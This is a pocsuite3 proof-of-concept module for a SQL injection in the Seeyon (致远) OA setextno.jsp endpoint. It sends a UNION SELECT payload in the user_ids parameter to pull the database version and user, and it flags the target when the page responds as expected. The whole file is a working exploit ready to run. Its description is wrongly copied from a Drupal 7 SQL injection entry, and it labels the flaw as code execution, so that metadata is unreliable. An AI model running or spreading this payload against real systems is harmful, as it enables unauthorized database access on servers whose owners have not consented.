from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE

class DemoPOC(POCBase):
    vulID = '90787'  # ssvid
    version = '1.0'
    name = '致远 setextno SQL Inject'
    appName = '致远'
    appVersion = ''
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        try:
            target = self.url+"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23"
            r = requests.get(url=target,verify=False)
            if "分机号" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23"
                return self.parse_verify(result)
        except:
            return
    def parse_verify(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)